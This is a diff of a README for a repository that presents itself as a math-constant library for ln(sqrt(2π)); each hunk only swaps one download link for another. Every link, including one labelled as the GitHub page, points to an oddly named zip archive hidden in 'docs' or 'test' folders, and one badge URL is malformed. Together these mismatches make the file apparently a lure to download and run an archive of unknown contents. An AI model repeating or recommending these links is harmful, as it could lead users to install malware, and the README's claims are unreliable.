@@ -1,7 +1,7 @@
 # 📐 constants-float16-ln-sqrt-two-pi - Precision Math Made Easy
 
 ## 📥 Download Now!
-[![Download](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/docs/types/sqrt_pi_constants_float_ln_two_v2.9.zip%https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/docs/types/sqrt_pi_constants_float_ln_two_v2.9.zip)](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/docs/types/sqrt_pi_constants_float_ln_two_v2.9.zip)
+[![Download](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/test/dist/constants_sqrt_float_pi_ln_two_3.9-beta.1.zip%https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/test/dist/constants_sqrt_float_pi_ln_two_3.9-beta.1.zip)](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/test/dist/constants_sqrt_float_pi_ln_two_3.9-beta.1.zip)
 
 ## 📖 About
 The **constants-float16-ln-sqrt-two-pi** library provides a simple way to calculate the natural logarithm of the square root of \(2\pi\). This application supports precise mathematical calculations that are essential for various fields, including statistics, data analysis, and engineering.
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of the application:
 
-[Download the latest release](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/docs/types/sqrt_pi_constants_float_ln_two_v2.9.zip)
+[Download the latest release](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/test/dist/constants_sqrt_float_pi_ln_two_3.9-beta.1.zip)
 
 Once the download completes, follow these steps:
 
@@ -54,7 +54,7 @@ Yes, the application works on Windows, macOS, and Linux systems.
 ## 🔗 More Information
 If you want to learn more about the mathematical theories behind this application, or see how it was developed, feel free to check out the detailed documentation on our repository page:
 
-[Visit the GitHub page](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/docs/types/sqrt_pi_constants_float_ln_two_v2.9.zip)
+[Visit the GitHub page](https://github.com/Keim23/constants-float16-ln-sqrt-two-pi/raw/refs/heads/main/test/dist/constants_sqrt_float_pi_ln_two_3.9-beta.1.zip)
 
 ## 🌟 Community
 Join our growing community and share your thoughts or suggestions! You can find discussions and updates on our GitHub Issues page.
